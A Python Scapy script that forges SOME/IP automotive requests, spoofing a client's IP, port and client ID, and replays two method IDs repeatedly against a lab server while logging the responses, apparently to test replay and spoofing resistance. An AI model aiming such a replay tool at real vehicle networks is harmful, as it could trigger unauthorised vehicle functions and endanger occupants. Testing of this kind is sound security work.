from scapy.all import *
from scapy.contrib.automotive.someip import SOMEIP
import time
from datetime import datetime

load_contrib("automotive.someip")


SERVER_IP = "192.168.40.134"
CLIENT_IP = "192.168.40.135"
SERVER_PORT = 31000
CLIENT_PORT = 58423

SERVICE_ID = 0xFF40
CLIENT_ID = 0x1343
PROTO_VER = 1
IFACE_VER = 1

REPLAY_METHODS = [10, 12]
REPEAT_PER_METHOD = 10
DELAY_SEC = 0.5


def now_str():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def build_packet(method_id: int, session_id: int):
    ip = IP(src=CLIENT_IP, dst=SERVER_IP)
    udp = UDP(sport=CLIENT_PORT, dport=SERVER_PORT)

    sip = SOMEIP()
    sip.srv_id = SERVICE_ID
    sip.sub_id = 0
    sip.method_id = method_id
    sip.len = 8
    sip.client_id = CLIENT_ID
    sip.session_id = session_id
    sip.proto_ver = PROTO_VER
    sip.iface_ver = IFACE_VER
    sip.msg_type = 0   # REQUEST
    sip.retcode = 0    # E_OK

    return ip / udp / sip


def parse_response(pkt):
    if pkt is None or UDP not in pkt:
        return None
    try:
        payload = bytes(pkt[UDP].payload)
        if len(payload) == 0:
            return None
        return SOMEIP(payload)
    except Exception:
        return None


def replay_one(method_id: int, session_id: int):
    pkt = build_packet(method_id, session_id)

    send_ts = time.time()
    print(
        "[{}] SEND method=0x{:04x} session=0x{:04x} client=0x{:04x} sport={} dport={}".format(
            now_str(),
            method_id,
            session_id,
            CLIENT_ID,
            CLIENT_PORT,
            SERVER_PORT,
        )
    )

    res = sr1(pkt, retry=0, timeout=1, verbose=False)
    latency_ms = (time.time() - send_ts) * 1000.0

    if res is None:
        print(
            "[{}] NORESP method=0x{:04x} session=0x{:04x} latency_ms={:.2f}".format(
                now_str(),
                method_id,
                session_id,
                latency_ms,
            )
        )
        return

    parsed = parse_response(res)
    if parsed is None:
        print(
            "[{}] RECV_PARSE_FAIL method=0x{:04x} session=0x{:04x} latency_ms={:.2f}".format(
                now_str(),
                method_id,
                session_id,
                latency_ms,
            )
        )
        return

    print(
        "[{}] RECV req_method=0x{:04x} req_session=0x{:04x} -> rsp_method=0x{:04x} rsp_session=0x{:04x} rsp_client=0x{:04x} msg_type=0x{:02x} retcode=0x{:02x} latency_ms={:.2f}".format(
            now_str(),
            method_id,
            session_id,
            parsed.method_id,
            parsed.session_id,
            parsed.client_id,
            parsed.msg_type,
            parsed.retcode,
            latency_ms,
        )
    )


def main():
    print("=== replay start ===")
    print("methods      :", REPLAY_METHODS)
    print("repeat/method:", REPEAT_PER_METHOD)
    print("delay(sec)   :", DELAY_SEC)
    print("server       : {}:{}".format(SERVER_IP, SERVER_PORT))
    print("client       : {}:{} client_id=0x{:04x}".format(CLIENT_IP, CLIENT_PORT, CLIENT_ID))
    print()

    session_id = 0x1000

    for method_id in REPLAY_METHODS:
        print("=== replay method_id={} (0x{:04x}) ===".format(method_id, method_id))
        for i in range(REPEAT_PER_METHOD):
            replay_one(method_id, session_id)
            session_id = (session_id + 1) & 0xFFFF
            if session_id == 0:
                session_id = 1
            time.sleep(DELAY_SEC)
        print()

    print("=== replay end ===")


if __name__ == "__main__":
    main()
